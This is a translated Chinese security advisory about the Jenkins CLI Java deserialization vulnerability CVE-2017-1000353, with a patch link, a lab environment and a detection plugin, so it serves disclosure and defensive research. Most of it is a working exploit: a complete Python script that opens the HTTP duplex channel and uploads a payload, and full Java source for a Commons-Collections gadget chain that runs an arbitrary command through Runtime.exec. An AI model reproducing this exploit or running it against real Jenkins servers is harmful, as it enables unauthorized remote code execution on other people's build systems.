# 【漏洞分析】Jenkins 未授权代码执行漏洞分析（更新漏洞环境、检测脚本）

阅读量 **351361**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-05-04 17:18:58

 **x**

##### 译文声明

本文是翻译文章，文章来源：securiteam.com

原文地址：<https://blogs.securiteam.com/index.php/archives/3171>

译文仅供参考，具体内容表达以及含义原文为准。

****

****

翻译：[ **興趣使然的小胃**](http://bobao.360.cn/member/contribute?uid=2819002922)

预估稿费：100RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**  
**

**一、摘要**

CloudBees Jenkins 2.32.1版本中存在Java反序列化漏洞，最终可导致远程代码执行。

Jenkins是一款持续集成（continuous integration）与持续交付（continuous
delivery）系统，可以提高软件研发流程中非人工参与部分的自动化处理效率。作为一个基于服务器的系统，Jenkins运行在servlet容器（如Apache
Tomcat）中，支持版本控制工具（包括AccuRev、CVS、Subversion、Git、Mercurial、Perforce、Clearcase以及RTC），能够执行基于Apache
Ant、Apache Maven以及sbt的工程，也支持shell脚本和Windows批处理命令。

  

**二、漏洞细节**

为了触发Jenkins的Java反序列化漏洞，我们需要向Jenkins发送两个请求。

该漏洞存在于使用HTTP协议的双向通信通道的具体实现代码中，Jenkins利用此通道来接收命令。

我们可以通过第一个请求，建立双向通道的一个会话，从服务器上下载数据。HTTP报文头部中的“Session”字段用来作为通道的识别符，“Side”字段表明传输的方向（下载或上传，download/upload）。

我们可以通过第二个请求向双向通道发送数据。服务器会阻塞第一个请求，直到我们发送第二个请求为止。HTTP报文头部中的“Session”字段是一个UUID，服务器通过该UUID来匹配具体提供服务的双向通道。

所有发往Jenkins CLI的命令中都包含某种格式的前导码（preamble），前导码格式通常如下所示：

    
    
    <===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=

该前导码包含一个经过base64编码的序列化对象。“Capability”类型的序列化对象的功能是告诉服务器客户端具备哪些具体功能（比如HTTP分块编码功能）。

前导码和其他一些额外字节发送完毕后，Jenkins服务器希望能够收到一个类型为“Command”的序列化对象。由于Jenkins没有验证序列化对象，因此我们可以向其发送任何序列化对象。

反序列化处理代码位于“Command”类的“readFrom”方法中，如下所示：

readFrom方法在“ClassicCommandTransport”类的“read()”方法中被调用：

通过上传通道发送的数据在ReaderThread线程类中进行读取，如下所示：

该线程由“upload”方法触发运行，而“upload”方法在“CliEndpointResponse”类中被调用：

“upload”方法读取HTTP body数据，之后调用“notify”方法通知线程进行处理。

  

**三、PoC**

为了利用该漏洞，攻击者需要运行“payload.jar”脚本，创建一个包含待执行命令的序列化载荷。

接下来，攻击者需要修改jenkins_poc1.py脚本：

1、修改URL变量所指向的目标url；

2、在“FILE_SER = open(“jenkins_poc1.ser”, “rb”).read()”那一行，将要打开的文件指向自己的载荷文件。

修改完毕后，你可以在jenkins的日志输出中看到如下信息：

    
    
    Jan 26, 2017 2:22:41 PM hudson.remoting.SynchronousCommandTransport$ReaderThread run
    SEVERE: I/O error in channel HTTP full-duplex channel a403c455-3b83-4890-b304-ec799bffe582
    hudson.remoting.DiagnosedStreamCorruptionException
    Read back: 0xac 0xed 0x00 0x05 'sr' 0x00 '/org.apache.commons.collections.map.ReferenceMap' 0x15 0x94 0xca 0x03 0x98 'I' 0x08 0xd7 0x03 0x00 0x00 'xpw' 0x11 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x01 0x00 '?@' 0x00 0x00 0x00 0x00 0x00 0x10 'sr' 0x00 '(java.util.concurrent.CopyOnWriteArraySetK' 0xbd 0xd0 0x92 0x90 0x15 'i' 0xd7 0x02 0x00 0x01 'L' 0x00 0x02 'alt' 0x00 '+Ljava/util/concurrent/CopyOnWriteArrayList;xpsr' 0x00 ')java.util.concurrent.CopyOnWriteArrayListx]' 0x9f 0xd5 'F' 0xab 0x90 0xc3 0x03 0x00 0x00 'xpw' 0x04 0x00 0x00 0x00 0x02 'sr' 0x00 '*java.util.concurrent.ConcurrentSkipListSet' 0xdd 0x98 'Py' 0xbd 0xcf 0xf1 '[' 0x02 0x00 0x01 'L' 0x00 0x01 'mt' 0x00 '-Ljava/util/concurrent/ConcurrentNavigableMap;xpsr' 0x00 '*java.util.concurrent.ConcurrentSkipListMap' 0x88 'Fu' 0xae 0x06 0x11 'F' 0xa7 0x03 0x00 0x01 'L' 0x00 0x0a
    'comparatort' 0x00 0x16 'Ljava/util/Comparator;xppsr' 0x00 0x1a 'java.security.SignedObject' 0x09 0xff 0xbd 'h*< ' 0xd5 0xff 0x02 0x00 0x03 '[' 0x00 0x07 'contentt' 0x00 0x02 '[B[' 0x00 0x09 'signatureq' 0x00 '~' 0x00 0x0e 'L' 0x00 0x0c 'thealgorithmt' 0x00 0x12 'Ljava/lang/String;xpur' 0x00 0x02 '[B' 0xac 0xf3 0x17 0xf8 0x06 0x08 'T' 0xe0 0x02 0x00 0x00 'xp' 0x00 0x00 0x05 0x01 0xac 0xed 0x00 0x05 'sr' 0x00 0x11 'java.util.HashSet' 0xba 'D' 0x85 0x95 0x96 0xb8 0xb7 '4' 0x03 0x00 0x00 'xpw' 0x0c 0x00 0x00 0x00 0x02 '?@' 0x00 0x00 0x00 0x00 0x00 0x01 'sr' 0x00 '4org.apache.commons.collections.keyvalue.TiedMapEntry' 0x8a 0xad 0xd2 0x9b '9' 0xc1 0x1f 0xdb 0x02 0x00 0x02 'L' 0x00 0x03 'keyt' 0x00 0x12 'Ljava/lang/Object;L' 0x00 0x03 'mapt' 0x00 0x0f 'Ljava/util/Map;xpt' 0x00 0x06 'randomsr' 0x00 '*org.apache.commons.collections.map.LazyMapn' 0xe5 0x94 0x82 0x9e 'y' 0x10 0x94 0x03 0x00 0x01 'L' 0x00 0x07 'factoryt' 0x00 ',Lorg/apache/commons/collections/Transformer;xpsr' 0x00 ':org.apache.commons.collections.functors.ChainedTransformer0' 0xc7 0x97 0xec '(z' 0x97 0x04 0x02 0x00 0x01 '[' 0x00 0x0d 'iTransformerst' 0x00 '-[Lorg/apache/commons/collections/Transformer;xpur' 0x00 '-[Lorg.apache.commons.collections.Transformer;' 0xbd 'V*' 0xf1 0xd8 '4' 0x18 0x99 0x02 0x00 0x00 'xp' 0x00 0x00 0x00 0x05 'sr' 0x00 ';org.apache.commons.collections.functors.ConstantTransformerXv' 0x90 0x11 'A' 0x02 0xb1 0x94 0x02 0x00 0x01 'L' 0x00 0x09 'iConstantq' 0x00 '~' 0x00 0x03 'xpvr' 0x00 0x11 'java.lang.Runtime' 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 'xpsr' 0x00 ':org.apache.commons.collections.functors.InvokerTransformer' 0x87 0xe8 0xff 'k{|' 0xce '8' 0x02 0x00 0x03 '[' 0x00 0x05 'iArgst' 0x00 0x13 '[Ljava/lang/Object;L' 0x00 0x0b 'iMethodNamet' 0x00 0x12 'Ljava/lang/String;[' 0x00 0x0b 'iParamTypest' 0x00 0x12 '[Ljava/lang/Class;xpur' 0x00 0x13 '[Ljava.lang.Object;' 0x90 0xce 'X' 0x9f 0x10 's)l' 0x02 0x00 0x00 'xp' 0x00 0x00 0x00 0x02 't' 0x00 0x0a
    'getRuntimeur' 0x00 0x12 '[Ljava.lang.Class;' 0xab 0x16 0xd7 0xae 0xcb 0xcd 'Z' 0x99 0x02 0x00 0x00 'xp' 0x00 0x00 0x00 0x00 't' 0x00 0x09 'getMethoduq' 0x00 '~' 0x00 0x1b 0x00 0x00 0x00 0x02 'vr' 0x00 0x10 'java.lang.String' 0xa0 0xf0 0xa4 '8z;' 0xb3 'B' 0x02 0x00 0x00 'xpvq' 0x00 '~' 0x00 0x1b 'sq' 0x00 '~' 0x00 0x13 'uq' 0x00 '~' 0x00 0x18 0x00 0x00 0x00 0x02 'puq' 0x00 '~' 0x00 0x18 0x00 0x00 0x00 0x00 't' 0x00 0x06 'invokeuq' 0x00 '~' 0x00 0x1b 0x00 0x00 0x00 0x02 'vr' 0x00 0x10 'java.lang.Object' 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 'xpvq' 0x00 '~' 0x00 0x18 'sq' 0x00 '~' 0x00 0x13 'ur' 0x00 0x13 '[Ljava.lang.String;' 0xad 0xd2 'V' 0xe7 0xe9 0x1d '{G' 0x02 0x00 0x00 'xp' 0x00 0x00 0x00 0x01 't' 0x00 0x05 'xtermt' 0x00 0x04 'execuq' 0x00 '~' 0x00 0x1b 0x00 0x00 0x00 0x01 'q' 0x00 '~' 0x00 ' sq' 0x00 '~' 0x00 0x0f 'sr' 0x00 0x11 'java.lang.Integer' 0x12 0xe2 0xa0 0xa4 0xf7 0x81 0x87 '8' 0x02 0x00 0x01 'I' 0x00 0x05 'valuexr' 0x00 0x10 'java.lang.Number' 0x86 0xac 0x95 0x1d 0x0b 0x94 0xe0 0x8b 0x02 0x00 0x00 'xp' 0x00 0x00 0x00 0x01 'sr' 0x00 0x11 'java.util.HashMap' 0x05 0x07 0xda 0xc1 0xc3 0x16 '`' 0xd1 0x03 0x00 0x02 'F' 0x00 0x0a
    'loadFactorI' 0x00 0x09 'thresholdxp?@' 0x00 0x00 0x00 0x00 0x00 0x00 'w' 0x08 0x00 0x00 0x00 0x10 0x00 0x00 0x00 0x00 'xxxuq' 0x00 '~' 0x00 0x11 0x00 0x00 0x00 '/0-' 0x02 0x14 'I:aj' 0x01 0xfe 0xe7 'Kh' 0x98 '-' 0x9c 'o!' 0x05 'H' 0x84 0xfa 0xb1 0x82 0x02 0x15 0x00 0x90 0x0a
    0x92 0x0d 'x' 0xa2 '~~' 0xdd 0xba 0xa3 0xe8 0xf6 'x3' 0xcd 0x98 0x06 '*t' 0x00 0x03 'DSAsr' 0x00 0x11 'java.lang.Boolean' 0xcd ' r' 0x80 0xd5 0x9c 0xfa 0xee 0x02 0x00 0x01 'Z' 0x00 0x05 'valuexp' 0x01 'pxsr' 0x00 '1org.apache.commons.collections.set.ListOrderedSet' 0xfc 0xd3 0x9e 0xf6 0xfa 0x1c 0xed 'S' 0x02 0x00 0x01 'L' 0x00 0x08 'setOrdert' 0x00 0x10 'Ljava/util/List;xr' 0x00 'Corg.apache.commons.collections.set.AbstractSerializableSetDecorator' 0x11 0x0f 0xf4 'k' 0x96 0x17 0x0e 0x1b 0x03 0x00 0x00 'xpsr' 0x00 0x15 'net.sf.json.JSONArray]' 0x01 'To(r' 0xd2 0x02 0x00 0x02 'Z' 0x00 0x0e 'expandElementsL' 0x00 0x08 'elementsq' 0x00 '~' 0x00 0x18 'xr' 0x00 0x18 'net.sf.json.AbstractJSON' 0xe8 0x8a 0x13 0xf4 0xf6 0x9b '?' 0x82 0x02 0x00 0x00 'xp' 0x00 'sr' 0x00 0x13 'java.util.ArrayListx' 0x81 0xd2 0x1d 0x99 0xc7 'a' 0x9d 0x03 0x00 0x01 'I' 0x00 0x04 'sizexp' 0x00 0x00 0x00 0x01 'w' 0x04 0x00 0x00 0x00 0x01 't' 0x00 0x06 'randomxxsq' 0x00 '~' 0x00 0x1e 0x00 0x00 0x00 0x00 'w' 0x04 0x00 0x00 0x00 0x00 'xxq' 0x00 '~' 0x00 ' sq' 0x00 '~' 0x00 0x02 'sq' 0x00 '~' 0x00 0x05 'w' 0x04 0x00 0x00 0x00 0x02 'q' 0x00 '~' 0x00 0x1a 'q' 0x00 '~' 0x00 0x09 'xq' 0x00 '~' 0x00 ' px'
    Read ahead: 
    at hudson.remoting.FlightRecorderInputStream.analyzeCrash(FlightRecorderInputStream.java:80)
    at hudson.remoting.ClassicCommandTransport.diagnoseStreamCorruption(ClassicCommandTransport.java:93)
    at hudson.remoting.ClassicCommandTransport.read(ClassicCommandTransport.java:75)
    at hudson.remoting.SynchronousCommandTransport$ReaderThread.run(SynchronousCommandTransport.java:59)
    Caused by: java.lang.ClassCastException: org.apache.commons.collections.map.ReferenceMap cannot be cast to hudson.remoting.Command
    at hudson.remoting.Command.readFrom(Command.java:96)
    at hudson.remoting.ClassicCommandTransport.read(ClassicCommandTransport.java:70)

相关的PoC文件为：

**3.1 jenkins_poc1.py**

    
    
    import urllib
    import requests
    import uuid
    import threading
    import time
    import gzip
    import urllib3
    import zlib
    proxies = {
    #  'http': 'http://127.0.0.1:8090',
    #  'https': 'http://127.0.0.1:8090',
    }
    URL='http://192.168.18.161:8080/cli'
    PREAMLE='<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='
    PROTO = 'x00x00x00x00'
    FILE_SER = open("jenkins_poc1.ser", "rb").read()
    def download(url, session):
        headers = {'Side' : 'download'}
        headers['Content-type'] = 'application/x-www-form-urlencoded'
        headers['Session'] = session
        headers['Transfer-Encoding'] = 'chunked'
        r = requests.post(url, data=null_payload(),headers=headers, proxies=proxies, stream=True)
        print r.text
    def upload(url, session, data):
        headers = {'Side' : 'upload'}
        headers['Session'] = session
        headers['Content-type'] = 'application/octet-stream'
        headers['Accept-Encoding'] = None
        r = requests.post(url,data=data,headers=headers,proxies=proxies)
    def upload_chunked(url,session, data):
        headers = {'Side' : 'upload'}
        headers['Session'] = session
        headers['Content-type'] = 'application/octet-stream'
        headers['Accept-Encoding']= None
        headers['Transfer-Encoding'] = 'chunked'
        headers['Cache-Control'] = 'no-cache'
        r = requests.post(url, headers=headers, data=create_payload_chunked(), proxies=proxies)
    def null_payload():
        yield " "
    def create_payload():
        payload = PREAMLE + PROTO + FILE_SER
        return payload
    def create_payload_chunked():
        yield PREAMLE
        yield PROTO
        yield FILE_SER
    def main():
        print "start"
        session = str(uuid.uuid4())
        t = threading.Thread(target=download, args=(URL, session))
        t.start()
        time.sleep(1)
        print "pwn"
        #upload(URL, session, create_payload())
        upload_chunked(URL, session, "asdf")
    if __name__ == "__main__":
        main()

**3.2 payload.jar**

    
    
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.io.ObjectStreamException;
    import java.io.Serializable;
    import java.lang.reflect.Field;
    import java.security.KeyPair;
    import java.security.KeyPairGenerator;
    import java.security.PrivateKey;
    import java.security.PublicKey;
    import java.security.Signature;
    import java.security.SignedObject;
    import java.util.Comparator;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    import java.util.concurrent.ConcurrentSkipListSet;
    import java.util.concurrent.CopyOnWriteArraySet;
    import net.sf.json.JSONArray;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.collection.AbstractCollectionDecorator;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections.map.ReferenceMap;
    import org.apache.commons.collections.set.ListOrderedSet;
    public class Payload implements Serializable {
        private Serializable payload;
        public Payload(String cmd) throws Exception {
            this.payload = this.setup(cmd);
        }
        public Serializable setup(String cmd) throws Exception {
            final String[] execArgs = new String[] { cmd };
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] { String.class,
                            Class[].class }, new Object[] { "getRuntime",
                            new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] { Object.class,
                            Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class },
                            execArgs), new ConstantTransformer(1) };
            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
            HashSet map = new HashSet(1);
            map.add("foo");
            Field f = null;
            try {
                f = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException e) {
                f = HashSet.class.getDeclaredField("backingMap");
            }
            f.setAccessible(true);
            HashMap innimpl = (HashMap) f.get(map);
            Field f2 = null;
            try {
                f2 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException e) {
                f2 = HashMap.class.getDeclaredField("elementData");
            }
            f2.setAccessible(true);
            Object[] array2 = (Object[]) f2.get(innimpl);
            Object node = array2[0];
            if (node == null) {
                node = array2[1];
            }
            Field keyField = null;
            try {
                keyField = node.getClass().getDeclaredField("key");
            } catch (Exception e) {
                keyField = Class.forName("java.util.MapEntry").getDeclaredField(
                        "key");
            }
            keyField.setAccessible(true);
            keyField.set(node, entry);
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
            keyPairGenerator.initialize(1024);
            KeyPair keyPair = keyPairGenerator.genKeyPair();
            PrivateKey privateKey = keyPair.getPrivate();
            PublicKey publicKey = keyPair.getPublic();
            Signature signature = Signature.getInstance(privateKey.getAlgorithm());
            SignedObject payload = new SignedObject(map, privateKey, signature);
            JSONArray array = new JSONArray();
            array.add("asdf");
            ListOrderedSet set = new ListOrderedSet();
            Field f1 = AbstractCollectionDecorator.class
                    .getDeclaredField("collection");
            f1.setAccessible(true);
            f1.set(set, array);
            DummyComperator comp = new DummyComperator();
            ConcurrentSkipListSet csls = new ConcurrentSkipListSet(comp);
            csls.add(payload);
            CopyOnWriteArraySet a1 = new CopyOnWriteArraySet();
            CopyOnWriteArraySet a2 = new CopyOnWriteArraySet();
            a1.add(set);
            Container c = new Container(csls);
            a1.add(c);
            a2.add(csls);
            a2.add(set);
            ReferenceMap flat3map = new ReferenceMap();
            flat3map.put(new Container(a1), "asdf");
            flat3map.put(new Container(a2), "asdf");
            return flat3map;
        }
        private Object writeReplace() throws ObjectStreamException {
            return this.payload;
        }
        static class Container implements Serializable {
            private Object o;
            public Container(Object o) {
                this.o = o;
            }
            private Object writeReplace() throws ObjectStreamException {
                return o;
            }
        }
        static class DummyComperator implements Comparator, Serializable {
            public int compare(Object arg0, Object arg1) {
                // TODO Auto-generated method stub
                return 0;
            }
            private Object writeReplace() throws ObjectStreamException {
                return null;
            }
        }
        public static void main(String args[]) throws Exception{
            if(args.length != 2){
                System.out.println("java -jar payload.jar outfile cmd");
                System.exit(0);
            }
            String cmd = args[1];
            FileOutputStream out = new FileOutputStream(args[0]);
            Payload pwn = new Payload(cmd);
            ObjectOutputStream oos = new ObjectOutputStream(out);
            oos.writeObject(pwn);
            oos.flush();
            out.flush();
        }
    }

**四、其他说明**

感谢某位独立安全研究员向SecuriTeam安全公告计划提交此漏洞。

CloudBees
Jenkins已经发布了安全补丁修复这个漏洞，读者可以参考[此处](https://jenkins.io/security/advisory/2017-04-26)获取更多细节。

  

**五、漏洞环境及检测脚本**

****

**感谢开源社区力量**  

漏洞靶场环境 由 **phithon** 维护

Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。

<https://github.com/phith0n/vulhub/tree/master/jenkins/CVE-2017-1000353>

  

漏洞检测插件 由YSRC社区成员 **Dee-Ng** 提供

该漏洞检测插件需要基于巡风系统使用，巡风是一款适用于企业内网的漏洞快速应急、巡航扫描系统，通过搜索功能可清晰的了解内部网络资产分布情况，并且可指定漏洞插件对搜索结果进行快速漏洞检测并输出结果报表。

<https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/jenkins_CVE_2017_1000353.py>

本文翻译自securiteam.com
[原文链接](https://blogs.securiteam.com/index.php/archives/3171)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86018](/post/id/86018)

安全客 - 有思想的安全新媒体

本文转载自: [securiteam.com](https://blogs.securiteam.com/index.php/archives/3171)

如若转载,请注明出处： <https://blogs.securiteam.com/index.php/archives/3171>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

